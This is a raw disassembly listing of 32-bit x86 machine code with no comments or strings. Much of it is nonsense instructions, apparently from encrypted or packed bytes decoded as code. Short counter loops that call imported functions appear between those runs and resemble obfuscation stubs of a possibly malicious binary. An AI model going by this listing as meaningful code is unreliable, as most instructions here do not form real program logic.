  409c3b:	xor    BYTE PTR [ebx+0x12],0x3a
  409c3f:	imul   eax,DWORD PTR [edi+0x58],0xffffff86
  409c43:	les    edi,FWORD PTR [edi-0x2508c487]
  409c49:	sbb    BYTE PTR [ebp-0x734e4c0d],ch
  409c4f:	xchg   ecx,eax
  409c50:	aaa    
  409c51:	outs   dx,DWORD PTR ds:[esi]
  409c52:	jne    0x409bf3
  409c54:	jg     0x409cc1
  409c56:	leave  
  409c57:	loop   0x409cd0
  409c59:	push   esi
  409c5a:	out    0x52,eax
  409c5c:	inc    edi
  409c5d:	stos   BYTE PTR es:[edi],al
  409c5e:	dec    esp
  409c5f:	pop    ebx
  409c60:	ror    DWORD PTR [edx+eax*1+0x43],1
  409c64:	dec    esi
  409c65:	pop    es
  409c66:	cwde   
  409c67:	jmp    0xc506:0xf8980a4a
  409c6e:	dec    esp
  409c6f:	leave  
  409c70:	ins    DWORD PTR es:[edi],dx
  409c71:	add    DWORD PTR [ebx+0x7e6dba83],esi
  409c77:	sub    dl,BYTE PTR [ebp-0x3c]
  409c7a:	cmp    esi,DWORD PTR [edi+0x34fd0c84]
  409c80:	pop    ecx
  409c81:	jb     0x409c3e
  409c83:	fwait
  409c84:	or     eax,0x562695cf
  409c89:	loopne 0x409ca2
  409c8b:	push   ebx
  409c8c:	aad    0xa
  409c8e:	jae    0x409c49
  409c90:	mov    edx,0x7b95f962
  409c95:	rol    WORD PTR [eax],cl
  409c98:	(bad)  
  409c99:	cmp    ah,BYTE PTR ds:0xc7a02bb5
  409c9f:	jmp    0x409c97
  409ca1:	call   0xb01:0x8c3291e2
  409ca8:	xor    eax,0xb00c9bac
  409cad:	addr16 jno 0x409c53
  409cb0:	jnp    0x409cc4
  409cb2:	mov    ds:0x38e0e312,eax
  409cb7:	sub    eax,0xb054ae94
  409cbc:	shr    bl,0x54
  409cbf:	(bad)  
  409cc0:	jmp    0xeb7a7b7d
  409cc5:	or     DWORD PTR [edi],0x7cc338e1
  409ccb:	dec    ebx
  409ccc:	pop    ecx
  409ccd:	pop    edi
  409cce:	adc    DWORD PTR fs:[edx+0x53],ebp
  409cd2:	(bad)  
  409cd3:	mov    WORD PTR [eax-0x4b],ds
  409cd6:	mov    al,0xd4
  409cd8:	push   cs
  409cd9:	sub    BYTE PTR [edx+0x25],bl
  409cdc:	les    esi,FWORD PTR [ebx]
  409cde:	cdq    
  409cdf:	lock adc eax,0x68651c0
  409ce5:	dec    edx
  409ce6:	mov    esi,0x8f862a56
  409ceb:	pop    edx
  409cec:	rcl    DWORD PTR [ecx+0x4d],cl
  409cef:	or     eax,DWORD PTR ds:0x78354d20
  409cf5:	push   edx
  409cf6:	pusha  
  409cf7:	sub    DWORD PTR [eax],eax
  409cf9:	mov    edx,0x16d0d698
  409cfe:	add    bh,ch
  409d00:	or     al,0x56
  409d02:	xchg   BYTE PTR [edx-0x9],al
  409d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d06:	inc    ebp
  409d07:	pop    ecx
  409d08:	add    DWORD PTR [eax+ebx*2],0x296a3fd1
  409d0f:	mov    edx,0x736257e5
  409d14:	add    eax,0x2ea46233
  409d19:	loopne 0x409d7b
  409d1b:	out    0xc9,al
  409d1d:	mov    edi,0xb21664bb
  409d22:	aaa    
  409d23:	push   0xc66279cb
  409d28:	push   cs
  409d29:	adc    eax,0xad118c34
  409d2e:	scas   eax,DWORD PTR es:[edi]
  409d2f:	adc    BYTE PTR [esi+0x64],ch
  409d32:	xor    al,0x9d
  409d34:	retf   0x2887
  409d37:	shr    BYTE PTR [edi+0x36da108f],1
  409d3d:	loope  0x409d90
  409d3f:	into   
  409d40:	xchg   esp,eax
  409d41:	ficom  DWORD PTR [eax+0x6a]
  409d44:	call   0xba4:0xdfcc9cc2
  409d4b:	in     al,0xff
  409d4d:	sbb    ebp,eax
  409d4f:	or     eax,0xbb8989a5
  409d54:	xchg   DWORD PTR [ecx-0x31],esi
  409d57:	sbb    DWORD PTR [edi+0x1b628612],esp
  409d5d:	icebp  
  409d5e:	rol    BYTE PTR cs:[ebx+0x1bd8eb00],0x2d
  409d66:	or     esi,DWORD PTR [ecx-0x15]
  409d69:	or     ch,BYTE PTR [edi]
  409d6b:	fisubr DWORD PTR [ecx-0x55f0c4d5]
  409d71:	ror    DWORD PTR [ebx],1
  409d73:	mov    DWORD PTR [esi-0x7c],edx
  409d76:	mov    eax,0xd672fed2
  409d7b:	sbb    cl,dl
  409d7d:	or     eax,0x854ef055
  409d82:	leave  
  409d83:	mov    DWORD PTR ds:0x433797,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	cld    
  409dbf:	xchg   BYTE PTR [ebx+0x7ee23842],bh
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409d90
  409dcb:	test   DWORD PTR [edi],0xa8f87a1e
  409dd1:	pop    ds
  409dd2:	hlt    
  409dd3:	xor    eax,0xfbcf6308
  409dd8:	mov    edx,0x25b4de1
  409ddd:	sub    bl,BYTE PTR [esi]
  409ddf:	dec    edi
  409de0:	scas   eax,DWORD PTR es:[edi]
  409de1:	jne    0x409e59
  409de3:	les    esi,FWORD PTR fs:[edx+0x2]
  409de7:	and    DWORD PTR [ecx],esp
  409de9:	hlt    
  409dea:	jnp    0x409e33
  409dec:	cmc    
  409ded:	outs   dx,DWORD PTR ds:[esi]
  409dee:	dec    edx
  409def:	and    esi,DWORD PTR [eax-0x47b4a98f]
  409df5:	das    
  409df6:	scas   eax,DWORD PTR es:[edi]
  409df7:	pop    es
  409df8:	push   cs
  409df9:	sbb    edi,DWORD PTR [edi-0x26]
  409dfc:	add    al,0x32
  409dfe:	int    0x15
  409e00:	stos   BYTE PTR es:[edi],al
  409e01:	pusha  
  409e02:	leave  
  409e03:	sbb    DWORD PTR [ecx-0x587e24c6],edi
  409e09:	fst    DWORD PTR ds:0x99bbca73
  409e0f:	push   ecx
  409e10:	inc    ebx
  409e11:	and    eax,0x9d4452c5
  409e16:	or     al,0x80
  409e18:	in     al,0x4d
  409e1a:	jnp    0x409e6d
  409e1c:	sub    al,BYTE PTR [esi+0x3f]
  409e1f:	test   eax,0xe1cebbdc
  409e24:	jo     0x409db5
  409e26:	mov    ch,0xd6
  409e28:	test   eax,0x2a400084
  409e2d:	mul    edi
  409e2f:	cld    
  409e30:	ins    BYTE PTR es:[edi],dx
  409e31:	js     0x409e63
  409e33:	mov    ds:0xde09bc45,eax
  409e38:	xlat   BYTE PTR ds:[ebx]
  409e39:	and    DWORD PTR [edi+0x33],0xc1136600
  409e40:	cdq    
  409e41:	es in  eax,0x59
  409e44:	std    
  409e45:	add    ebx,edi
  409e47:	xchg   esi,eax
  409e48:	mul    DWORD PTR [ebx]
  409e4a:	rcl    BYTE PTR [edi+0x71],0x56
  409e4e:	pop    ebx
  409e4f:	loope  0x409df3
  409e51:	mov    dh,0x1c
  409e53:	std    
  409e54:	leave  
  409e55:	call   0xfa42f93b
  409e5a:	clc    
  409e5b:	jo     0x409e9c
  409e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e5e:	outs   dx,BYTE PTR ds:[esi]
  409e5f:	mov    bl,0xd3
  409e61:	cmc    
  409e62:	xor    DWORD PTR [edx-0x45],0x6a
  409e66:	in     al,dx
  409e67:	test   esi,ecx
  409e69:	ins    DWORD PTR es:[edi],dx
  409e6a:	sbb    eax,0x2ddd41c2
  409e6f:	sub    bh,dl
  409e71:	cmp    BYTE PTR [ecx+0x63f45baa],bl
  409e77:	mov    eax,0x2c1b1d9f
  409e7c:	inc    ebx
  409e7d:	add    ecx,edi
  409e7f:	dec    esp
  409e80:	mov    al,ds:0x1d856d07
  409e85:	test   DWORD PTR [edi+eax*8],edi
  409e88:	mov    esp,0x95030d7
  409e8d:	repnz xchg edi,eax
  409e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e90:	adc    edx,edx
  409e92:	(bad)  
  409e93:	loope  0x409ed5
  409e95:	and    DWORD PTR [esi+0x1d],esp
  409e98:	addr16 push esi
  409e9a:	add    eax,DWORD PTR [esi+0x2eb9fcff]
  409ea0:	or     al,0x81
  409ea2:	pop    ss
  409ea3:	call   DWORD PTR [eax]
  409ea5:	mov    ebp,0x5c4c6054
  409eaa:	jns    0x409ebb
  409eac:	popa   
  409ead:	xchg   esp,eax
  409eae:	test   al,0xfa
  409eb0:	push   0x18dc28d1
  409eb5:	pop    ebp
  409eb6:	pop    ebx
  409eb7:	sub    ah,BYTE PTR [eax+0x47]
  409eba:	call   0xc0a1d656
  409ebf:	push   ecx
  409ec0:	lods   eax,DWORD PTR ds:[esi]
  409ec1:	cwde   
  409ec2:	or     dh,0x1e
  409ec5:	or     bl,ch
  409ec7:	cld    
  409ec8:	js     0x409f35
  409eca:	cmp    al,0x50
  409ecc:	xchg   ah,ah
  409ece:	mov    eax,ds:0x841d0e6e
  409ed3:	hlt    
  409ed4:	xchg   edx,eax
  409ed5:	inc    ecx
  409ed6:	jb     0x409eed
  409ed8:	icebp  
  409ed9:	mov    dl,0x8f
  409edb:	adc    ch,ch
  409edd:	xchg   DWORD PTR [esi+0x44],eax
  409ee0:	shl    BYTE PTR [eax],0xaf
  409ee3:	enter  0xe93a,0x19
  409ee7:	into   
  409ee8:	std    
  409ee9:	outs   dx,DWORD PTR ds:[esi]
  409eea:	cld    
  409eeb:	imul   ebx,esi,0x31046b58
  409ef1:	inc    ecx
  409ef2:	test   DWORD PTR ds:0x13da2327,ebx
  409ef8:	js     0x409ece
  409efa:	and    eax,0xf1a0bc61
  409eff:	in     eax,dx
  409f00:	call   0xc05963da
  409f05:	add    al,0xf0
  409f07:	int    0x31
  409f09:	out    0xf,eax
  409f0b:	aaa    
  409f0c:	xchg   ebx,eax
  409f0d:	jge    0x409f8b
  409f0f:	cmp    bl,BYTE PTR [ecx]
  409f11:	pop    ss
  409f12:	cld    
  409f13:	mov    DWORD PTR [esi-0x28],ebx
  409f16:	dec    di
  409f18:	cli    
  409f19:	in     eax,dx
  409f1a:	xlat   BYTE PTR ds:[ebx]
  409f1b:	out    0x2f,al
  409f1d:	(bad)  
  409f1e:	popa   
  409f1f:	xor    esi,DWORD PTR [ecx-0x5a]
  409f22:	je     0x409f09
  409f24:	xchg   edi,eax
  409f25:	cs imul ebp,ecx,0xf5452fe3
  409f2c:	clc    
  409f2d:	cli    
  409f2e:	jecxz  0x409f85
  409f30:	pop    ebx
  409f31:	pop    es
  409f32:	ins    BYTE PTR es:[edi],dx
  409f33:	popf   
  409f34:	pop    ebp
  409f35:	mov    WORD PTR [edx],ds
  409f37:	xlat   BYTE PTR ds:[ebx]
  409f38:	ja     0x409f7a
  409f3a:	std    
  409f3b:	dec    esp
  409f3c:	cwde   
  409f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f3e:	lods   al,BYTE PTR ds:[esi]
  409f3f:	in     al,dx
  409f40:	push   ds
  409f41:	or     ebp,ebx
  409f43:	xor    eax,0x26d1b452
  409f48:	push   ebp
  409f4a:	push   esi
  409f4b:	loopne 0x409ede
  409f4d:	push   ebp
  409f4e:	fucomi st,st(0)
  409f50:	cmp    DWORD PTR [ecx+ebx*8-0x2],edi
  409f54:	mov    dl,0x18
  409f56:	sbb    DWORD PTR [ecx+0x6d9e8c08],esi
  409f5c:	push   ds
  409f5d:	das    
  409f5e:	dec    BYTE PTR [eax]
  409f60:	aas    
  409f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f62:	pop    ss
  409f63:	lock jb 0x409f15
  409f66:	lea    eax,[esi+ecx*2-0x6a]
  409f6a:	dec    DWORD PTR [esi+0x5c36d48e]
  409f70:	inc    edi
  409f71:	call   0xd97ba31c
  409f76:	sbb    ch,bl
  409f78:	push   es
  409f79:	mul    BYTE PTR [ebx]
  409f7b:	and    cl,BYTE PTR [edx+0x1b9c4eb8]
  409f81:	mov    ch,0xd
  409f83:	add    al,0xd3
  409f85:	out    dx,al
  409f86:	fisttp QWORD PTR [esi-0x71c1e331]
  409f8c:	sbb    eax,DWORD PTR [ebp-0x65]
  409f8f:	push   0xf82906d5
  409f94:	mov    cl,0xa5
  409f96:	repnz iret 
  409f98:	add    BYTE PTR [esi-0x66],cl
  409f9b:	into   
  409f9c:	mov    DWORD PTR [edi-0x7b30daf8],ebx
  409fa2:	out    0x81,eax
  409fa4:	cmp    al,0xaa
  409fa6:	in     eax,0x4b
  409fa8:	push   esp
  409fa9:	aaa    
  409faa:	enter  0xfda2,0x55
  409fae:	mov    dl,BYTE PTR [esi]
  409fb0:	in     eax,0x56
  409fb2:	out    dx,al
  409fb3:	add    ch,al
  409fb5:	add    DWORD PTR es:[eax],esi
  409fb8:	add    ebx,ecx
  409fba:	or     DWORD PTR [ebx+0x4c],ebx
  409fbd:	mov    al,0x78
  409fbf:	aad    0x4e
  409fc1:	ins    BYTE PTR es:[edi],dx
  409fc2:	xchg   esi,eax
  409fc3:	cmp    bh,0x47
  409fc6:	ja     0x409fb4
  409fc8:	lahf   
  409fc9:	and    al,0x23
  409fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fcc:	sbb    bh,dl
  409fce:	add    dh,ch
  409fd0:	inc    ecx
  409fd1:	ins    BYTE PTR es:[edi],dx
  409fd2:	xor    eax,0x66f21b12
  409fd7:	in     al,0x25
  409fd9:	ss idiv edx
  409fdc:	xchg   esp,eax
  409fdd:	out    dx,eax
  409fde:	lods   eax,DWORD PTR ds:[esi]
  409fe0:	(bad)  
  409fe1:	and    ah,bh
  409fe3:	sbb    DWORD PTR [esi+edi*1+0x6],ebx
  409fe7:	and    eax,0x12d8c8c0
  409fec:	fdivrp st(1),st
  409fee:	push   cs
  409fef:	or     ebx,DWORD PTR [ebp-0x5a]
  409ff2:	inc    edi
  409ff3:	call   0x7c50b976
  409ff8:	xchg   esi,eax
  409ff9:	into   
  409ffa:	mov    bh,0x35
  409ffc:	shl    DWORD PTR [ebp-0x67],1
  409fff:	(bad)  
  40a000:	into   
  40a001:	jge    0x40a050
  40a003:	xlat   BYTE PTR ds:[ebx]
  40a004:	popa   
  40a005:	ror    esp,0xc0
  40a008:	xchg   BYTE PTR [ebx-0x4c826683],dh
  40a00e:	mov    al,ds:0xd0af0ff8
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	sub    ebx,DWORD PTR [esi]
  40a128:	and    bh,BYTE PTR [edx+eax*4+0x387e7ee0]
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a13d
  40a133:	repnz sbb DWORD PTR [edx],edx
  40a136:	jae    0x40a11e
  40a138:	jecxz  0x40a18e
  40a13a:	push   0xffffffb3
  40a13c:	out    0xeb,al
  40a13e:	cld    
  40a13f:	cmc    
  40a140:	fidivr DWORD PTR [ecx+eiz*2-0xd7a2953]
  40a147:	adc    eax,0x4e8399b4
  40a14c:	mov    dh,0xc5
  40a14e:	hlt    
  40a14f:	adc    DWORD PTR [edx],eax
  40a151:	jno    0x40a157
  40a153:	repnz sbb eax,0x685c60f3
  40a159:	inc    esi
  40a15a:	sub    al,al
  40a15c:	sub    ebx,edi
  40a15e:	repz retf 0xd1e6
  40a162:	(bad)
  40a166:	and    edx,DWORD PTR [ebp-0x28a3800b]
  40a16c:	enter  0xe32c,0xb
  40a170:	add    DWORD PTR [edx+edx*2],esp
  40a173:	inc    ebx
  40a174:	or     BYTE PTR [edx+ebp*4+0x397e0c97],cl
  40a17b:	mov    al,0x4a
  40a17d:	or     edx,0xaa7ca01f
  40a183:	lock ret 0x66c3
  40a187:	mov    esi,0x95784c20
  40a18c:	lock push ds
  40a18e:	inc    ebx
  40a18f:	pop    es
  40a190:	mov    esp,0x83322770
  40a195:	lds    esp,FWORD PTR [eax]
  40a197:	mov    ch,0xdb
  40a199:	xchg   ebp,eax
  40a19a:	cmp    eax,0xd9f649da
  40a19f:	dec    ecx
  40a1a0:	xchg   edi,eax
  40a1a1:	cmp    DWORD PTR [ebx+0x2d],edx
  40a1a4:	les    edi,FWORD PTR [edx]
  40a1a6:	pop    esp
  40a1a7:	jmp    0xaafd:0x881bb866
  40a1ae:	fdivr  st,st(3)
  40a1b0:	fisttp QWORD PTR [edi]
  40a1b2:	pop    ds
  40a1b3:	stc    
  40a1b4:	pop    eax
  40a1b5:	pop    ebx
  40a1b6:	repnz sub dl,BYTE PTR [ebx+0x2bc8d675]
  40a1bd:	dec    eax
  40a1be:	(bad)  
  40a1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1c1:	push   ebx
  40a1c2:	or     DWORD PTR [edx],ebp
  40a1c4:	mov    bl,0xb4
  40a1c6:	mov    dl,BYTE PTR [edx]
  40a1c8:	pop    ecx
  40a1c9:	les    eax,FWORD PTR [ebx+0x12]
  40a1cc:	outs   dx,BYTE PTR ds:[esi]
  40a1cd:	sbb    al,0x1c
  40a1cf:	pop    esi
  40a1d0:	inc    esp
  40a1d1:	jge    0x40a18a
  40a1d3:	je     0x40a192
  40a1d5:	mov    ch,0x97
  40a1d7:	push   esi
  40a1d8:	xchg   BYTE PTR [ebx],cl
  40a1da:	jg     0x40a21f
  40a1dc:	fild   DWORD PTR [edx+ebp*8-0x238d8d81]
  40a1e3:	cmp    dh,BYTE PTR [edi-0x41]
  40a1e6:	sbb    dl,bl
  40a1e8:	imul   edi,DWORD PTR [ebx-0x75],0x257a0bd8
  40a1ef:	sti    
  40a1f0:	rcl    BYTE PTR [edi-0x4c3b1777],cl
  40a1f6:	retf   0x75d8
  40a1f9:	div    edi
  40a1fb:	lods   eax,DWORD PTR ds:[esi]
  40a1fc:	cmp    eax,0x5642e236
  40a201:	fmulp  st(4),st
  40a203:	push   ebp
  40a204:	push   edi
  40a205:	int    0x4
  40a207:	test   BYTE PTR [edx+0x6],ah
  40a20a:	ja     0x40a1d1
  40a20c:	addr16 jae 0x40a223
  40a20f:	pop    esi
  40a210:	clc    
  40a211:	push   edi
  40a212:	enter  0xf02d,0xa8
  40a216:	sub    DWORD PTR [edx],edi
  40a218:	push   ds
  40a219:	mov    esi,0x348ea76d
  40a21e:	pop    ecx
  40a21f:	outs   dx,BYTE PTR ds:[esi]
  40a220:	(bad)
  40a224:	adc    DWORD PTR [ecx],0x35
  40a227:	push   cs
  40a228:	fbld   TBYTE PTR [ebp-0x3c4a60f4]
  40a22e:	sahf   
  40a22f:	inc    ebp
  40a230:	(bad)  
  40a231:	mov    dh,0xc3
  40a233:	cdq    
  40a234:	inc    esi
  40a235:	leave  
  40a236:	add    al,0x26
  40a238:	div    DWORD PTR [ebx-0x36a2f2f5]
  40a23e:	jge    0x40a1cb
  40a240:	jmp    0xac66:0xf26e55f7
  40a247:	dec    ecx
  40a248:	mov    ss,WORD PTR [esp+esi*4-0xc]
  40a24c:	inc    esp
  40a24d:	dec    edx
  40a24e:	mov    esp,0x14db3f0
  40a253:	out    0xf0,eax
  40a255:	mov    cl,0xb8
  40a257:	sbb    ah,BYTE PTR [ebx+0x73]
  40a25a:	dec    esi
  40a25b:	stos   DWORD PTR es:[edi],eax
  40a25c:	add    cl,cl
  40a25e:	and    DWORD PTR [ebx+0x40],0xffffffbc
  40a262:	push   esp
  40a263:	cmp    cl,dh
  40a265:	popf   
  40a266:	retf   0xee6f
  40a269:	mov    ds:0x5044f5d7,al
  40a26e:	icebp  
  40a26f:	les    esi,FWORD PTR [ebp-0x3eaf828d]
  40a275:	dec    eax
  40a276:	sbb    BYTE PTR [edi-0x64],al
  40a279:	add    DWORD PTR [edi-0x25],esp
  40a27c:	fiadd  DWORD PTR [edi+eiz*4+0x37]
  40a280:	jnp    0x40a2fe
  40a282:	fwait
  40a283:	dec    eax
  40a284:	adc    DWORD PTR [ebx-0x3d2b82f7],edi
  40a28a:	and    al,0x68
  40a28c:	sub    ebx,DWORD PTR [esi]
  40a28e:	test   eax,0x25343af6
  40a293:	pop    es
  40a294:	into   
  40a295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a296:	in     eax,dx
  40a297:	sbb    cl,BYTE PTR [eax+0x49]
  40a29a:	lods   al,BYTE PTR ds:[esi]
  40a29b:	fimul  DWORD PTR [edx-0x14]
  40a29e:	in     eax,0x7d
  40a2a0:	mov    edi,0x2d76b1b8
  40a2a5:	mov    dh,0x66
  40a2a7:	leave  
  40a2a8:	aaa    
  40a2a9:	mov    bh,0x97
  40a2ab:	ss inc eax
  40a2ad:	fwait
  40a2ae:	test   BYTE PTR [esi],bl
  40a2b0:	sub    al,0x71
  40a2b2:	ds (bad) 
  40a2b4:	out    0x1b,al
  40a2b6:	cli    
  40a2b7:	xchg   ecx,eax
  40a2b8:	daa    
  40a2b9:	or     dl,BYTE PTR [eax]
  40a2bb:	arpl   WORD PTR [ebx],dx
  40a2bd:	lock jnp 0x40a2e3
  40a2c0:	rcr    ebp,cl
  40a2c2:	and    DWORD PTR [edi-0x5c],ebx
  40a2c5:	dec    esi
  40a2c6:	pop    ss
  40a2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2c8:	dec    edi
  40a2c9:	xchg   esi,eax
  40a2ca:	jge    0x40a316
  40a2cc:	les    edx,FWORD PTR ds:0xf80228f5
  40a2d2:	mov    edi,esi
  40a2d4:	pop    es
  40a2d5:	dec    edi
  40a2d6:	repz rcr DWORD PTR [edx],0xda
  40a2da:	test   eax,0xf1e41b3a
  40a2df:	inc    esp
  40a2e0:	mov    ah,0xe1
  40a2e2:	push   ds
  40a2e3:	jmp    0x40a358
  40a2e5:	inc    ebx
  40a2e6:	mov    bh,0x90
  40a2e8:	(bad)  
  40a2e9:	ins    DWORD PTR es:[edi],dx
  40a2ea:	or     DWORD PTR [edx-0x47],edx
  40a2ed:	jg     0x40a2d8
  40a2ef:	into   
  40a2f0:	xlat   BYTE PTR ds:[ebx]
  40a2f1:	mov    al,0x19
  40a2f3:	mov    edi,0x21507569
  40a2f8:	call   DWORD PTR [ebx+0x7e]
  40a2fb:	repz add DWORD PTR [edx+0x4],esp
  40a2ff:	mov    ebp,0xa8b00260
  40a304:	iret   
  40a305:	jg     0x40a2d1
  40a307:	leave  
  40a308:	mov    WORD PTR [edx+0x36],gs
  40a30b:	push   cs
  40a30c:	test   eax,0x37c60e84
  40a311:	fwait
  40a312:	enter  0xec6c,0xba
  40a316:	hlt    
  40a317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a318:	mov    ah,BYTE PTR [esi+edx*1]
  40a31b:	and    edx,0x0
  40a31e:	shl    eax,0xe5
  40a321:	icebp  
  40a322:	loope  0x40a347
  40a324:	jp     0x40a322
  40a326:	aaa    
  40a327:	(bad)  
  40a328:	mov    ecx,0x9e4cac49
  40a32d:	mov    ah,BYTE PTR [eax]
  40a32f:	jp     0x40a33a
  40a331:	cmp    ebp,DWORD PTR [ebx]
  40a333:	xchg   esi,eax
  40a334:	jle    0x40a2eb
  40a336:	mov    bl,0xed
  40a338:	xchg   BYTE PTR [ebx],cl
  40a33a:	mov    cs,WORD PTR [edx+0x258a2ef7]
  40a340:	pop    DWORD PTR [edx+0x79487d80]
  40a346:	mov    DWORD PTR [esi-0x32],ebx
  40a349:	mov    dh,0x7f
  40a34b:	xor    DWORD PTR [edx+0x5],ebp
  40a34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a34f:	pushf  
  40a350:	add    al,0x9e
  40a352:	and    ah,ah
  40a354:	int3   
  40a355:	lds    esi,FWORD PTR [eax+0x71]
  40a358:	adc    al,0x4b
  40a35a:	mov    bh,0x14
  40a35c:	mov    eax,0xdf7d0cb8
  40a361:	pop    edx
  40a362:	(bad)  
  40a364:	in     al,dx
  40a365:	out    0x11,al
  40a367:	mov    edx,0x5ac45d7
  40a36c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a36e:	mov    dl,0x1d
  40a370:	(bad)  
  40a371:	into   
  40a372:	cmc    
  40a373:	sti    
  40a374:	ja     0x40a39a
  40a376:	mov    ebp,0xe84d8bb1
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x43377b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43377b
  40a394:	inc    eax
  40a395:	mov    ds:0x43377b,eax
  40a39a:	cmp    DWORD PTR ds:0x43377b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
